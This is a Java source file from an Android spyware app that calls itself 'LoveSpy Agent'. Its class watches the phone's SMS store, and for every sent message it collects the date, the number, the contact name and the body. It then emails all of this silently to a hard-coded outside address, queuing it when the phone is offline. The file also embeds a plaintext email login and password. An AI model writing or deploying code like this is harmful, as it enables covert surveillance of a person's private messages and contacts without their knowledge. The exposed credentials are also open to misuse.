package com.example.skyspy.app.sms;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Handler;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;

import com.example.skyspy.app.email.EmailSending;
import com.example.skyspy.app.network.NetworkStatus;
import com.example.skyspy.app.network.NetworkUpdateReceiver;
import com.example.skyspy.app.utils.Utils;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

public class SmsSentObserver extends ContentObserver {

    private static final Uri STATUS_URI = Uri.parse("content://sms");
    private static String mPreviousId = "";

    private Context mContext;

    public SmsSentObserver(Handler handler, Context ctx) {
        super(handler);
        mContext = ctx;
    }

    public boolean deliverSelfNotifications() {
        return true;
    }

    public void onChange(boolean selfChange) {
        String sms = "";
        try{
            Cursor cur = mContext.getContentResolver().query(STATUS_URI, null, null, null, null);
            if (cur != null) {
                if (cur.moveToFirst()) {
                    String type = getSmsTypeName(cur.getInt(cur.getColumnIndexOrThrow("type")));
                    String id = cur.getString(cur.getColumnIndexOrThrow("_id"));
                    if (type.equals("SENT") && !id.equals(mPreviousId)) {
                        mPreviousId = id;
                        String number = cur.getString(cur.getColumnIndexOrThrow("address"));
                        sms += "Date: "+getDate(cur.getLong(cur.getColumnIndexOrThrow("date")))+"\n";
                        sms += "Type: "+type+"\n";
                        if (number != null) {
                            sms += "Number: "+number+"\n";
                        } else {
                            number = getNumber(cur.getString(cur.getColumnIndexOrThrow("thread_id")));
                            sms += "Number: "+number+"\n";
                        }
                        sms += "Name: "+getContactName(number)+"\n";
                        sms += "Body: "+removeNewLine(cur.getString(cur.getColumnIndexOrThrow("body")))+"\n";
                        sms += "_______________"+"\n\n";
                    }
                    if (!sms.equals("")) {
                        new AsyncTask<String,Void,Void>() {
                            @Override
                            protected Void doInBackground(String... params) {
                                String letter = params[0];
                                trySending(letter);
                                return null;
                            }
                        }.execute(sms);
                    }
                }
            }
            cur.close();
        }
        catch(Exception sggh){
            sggh.printStackTrace();
        }
        super.onChange(selfChange);
    }

    private void trySending(String letter) {
        if (NetworkStatus.getInstance(mContext).isOnline()) {
            sendEmailSilently(letter);
        } else {
            SmsReader.SUSPENDED_LIST.add(letter);
            NetworkUpdateReceiver.setLetterList(SmsReader.SUSPENDED_LIST);
        }
    }

    private String getNumber(String thread_id){
        String recipient_id = null;
        String number = null;
        Uri convUri = Uri.parse("content://mms-sms/conversations?simple=true");
        String[] projection = new String[] {Telephony.Threads.RECIPIENT_IDS};
        Cursor cur = mContext.getContentResolver().query(convUri, projection, "_id = "+thread_id, null, null);
        if (cur.moveToNext()) {
            recipient_id = cur.getString(cur.getColumnIndexOrThrow("recipient_ids"));
        }
        cur.close();
        if (recipient_id != null) {
            Uri addrUri = Uri.parse("content://mms-sms/canonical-addresses");
            cur = mContext.getContentResolver().query(addrUri, null, "_id = " + recipient_id, null, null);
            if (cur.moveToNext()) {
                number = cur.getString(cur.getColumnIndexOrThrow("address"));
            }
        }
        cur.close();
        return number;
    }

    private String getContactName(String address) {
        String name = null;
        Uri peopleUri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(address));
        String[] projection = new String[] { ContactsContract.PhoneLookup.DISPLAY_NAME };
        Cursor cur = mContext.getContentResolver().query(peopleUri, projection, null, null, null);
        if (cur.getCount() > 0) {
            cur.moveToFirst();
            name = cur.getString(cur.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
        }
        cur.close();
        return name;
    }

    private String getSmsTypeName(Integer type) {
        String str = "";
        if (type == Telephony.TextBasedSmsColumns.MESSAGE_TYPE_ALL) {
            str = "ALL";
        } else if (type == Telephony.TextBasedSmsColumns.MESSAGE_TYPE_INBOX) {
            str = "INBOX";
        } else if (type == Telephony.TextBasedSmsColumns.MESSAGE_TYPE_SENT) {
            str = "SENT";
        } else if (type == Telephony.TextBasedSmsColumns.MESSAGE_TYPE_DRAFT) {
            str = "DRAFT";
        } else if (type == Telephony.TextBasedSmsColumns.MESSAGE_TYPE_OUTBOX) {
            str = "OUTBOX";
        } else if (type == Telephony.TextBasedSmsColumns.MESSAGE_TYPE_FAILED) {
            str = "FAILED";
        } else if (type == Telephony.TextBasedSmsColumns.MESSAGE_TYPE_QUEUED) {
            str = "QUEUED";
        }
        return str;
    }

    private String getDate(Long timeMs) {
        Date date = new Date(timeMs);
        DateFormat df = new SimpleDateFormat("MM/dd/yyyy HH:mm:ss");
        return df.format(date);
    }

    private String removeNewLine(String str){
        str = str.replace("\n"," ");
        return str;
    }

    private void sendEmailSilently(String letter) {
        EmailSending emailSending = new EmailSending("o.kapustiyan@gmail.com", "samsungforever");
        String[] toArr = {"1eecooper@ukr.net"};
        emailSending.setTo(toArr);
        emailSending.setFrom("wooo@wooo.com");
        emailSending.setSubject("[Sms] LoveSpy Agent");
        try {
            emailSending.sendSilently(letter);
        } catch(Exception e) {
            Log.e(Utils.TAG, "Could not send email", e);
        }
    }
}
